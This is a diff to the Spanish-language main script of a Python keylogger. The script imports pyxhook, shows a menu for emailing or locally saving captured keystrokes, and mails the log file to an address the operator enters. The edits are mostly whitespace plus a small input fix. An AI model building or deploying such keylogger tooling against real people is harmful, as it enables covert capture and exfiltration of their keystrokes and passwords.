@@ -1,4 +1,3 @@
-
 import time
 import sys
 import pyxhook
@@ -7,8 +6,8 @@ from keylogger_core import KeyloggerCore
 from file_manager import guardar_en_archivo
 from email_handler import enviar_email
 
-
 def mostrar_menu() -> (bool, bool):
+   
     print("============= Configuración del keylogger =============")
     print("Responde 'yes'/'y' para SÍ, 'no'/'n' para NO, o 'exit' para salir.\n")
 
@@ -45,7 +44,6 @@ def mostrar_menu() -> (bool, bool):
     print()
     return enviar, guardar
 
-
 def main():
     enviar, guardar = mostrar_menu()
     logger = KeyloggerCore(enviar_correo=enviar, guardar_local=guardar)
@@ -79,7 +77,13 @@ def main():
 
         if enviar:
             if archivo_generado:
+                print("\n")
                 destinatario = input("Ingresa el correo destinatario: ").strip()
+
+                lower_dest = destinatario.lower()
+                if lower_dest.startswith("exit"):
+                    destinatario = destinatario[4:].lstrip()
+
                 if "@" in destinatario and "." in destinatario:
                     enviar_email(destinatario, archivo_generado)
                 else:
@@ -88,7 +92,6 @@ def main():
                 print("No se generó un archivo para adjuntar; no se envía correo.")
 
         print("\n============= Keylogger finalizado. =============")
-
 
 if __name__ == "__main__":
     main()
